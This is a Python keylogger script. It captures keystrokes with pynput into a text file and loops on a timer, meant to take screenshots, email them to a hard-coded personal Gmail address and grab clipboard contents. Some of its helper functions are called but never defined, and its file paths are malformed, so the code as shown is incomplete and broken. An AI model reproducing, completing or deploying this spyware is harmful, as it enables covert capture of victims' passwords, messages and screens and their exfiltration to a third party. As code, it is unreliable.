from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import time

number_of_iterations = 0
number_of_iterations_end = 5  # Adjust the number of iterations you want
time_iteration = 30  # Time interval in seconds

extend="C:\\Users\\Dell\\OneDrive\\Desktop\\logger\\"

currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Function to capture and write key presses to a file
def write_file(keys):
    with open("C:\\Users\\Dell\\OneDrive\\Desktop\\logger\\" + extend + "clipboard.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            if currentTime > stoppingTime:
                f.write(" ")
        f.close()

# Function to capture keyboard presses
def on_press(key):
    global keys, count, currentTime
    keys.append(key)
    count += 1
    currentTime = time.time()
    
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

# Function to release the listener
def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False

# Loop to execute keylogger
while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        # Clear the key file
        with open("C:\\Users\\Dell\\OneDrive\\Desktop\\logger\\" + extend + "clipboard.txt", "w") as f:
            f.write(" ")
        
        # Capture a screenshot
        screenshot()

        # Send an email with the screenshot as an attachment
        send_email("screenshot.png", "C:\\Users\\Dell\\OneDrive\\Desktop\\logger\\screenshots\\" + extend + "screenshot.png", "llaxmikant956@gmail.com")

        # Copy clipboard content
        copy_clipboard()

        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
